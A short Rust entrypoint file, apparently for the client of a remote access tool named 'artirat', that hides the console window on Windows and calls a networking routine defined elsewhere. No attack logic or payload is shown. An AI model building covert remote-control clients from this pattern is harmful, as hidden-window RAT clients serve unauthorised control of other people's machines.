#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use anyhow::Result;
use artirat_client::netclient;
/// Actual binary entrypoint (thin wrapper)
#[tokio::main]
async fn main() -> Result<()> {
    artirat_client::netclient().await?;
    Ok(())
}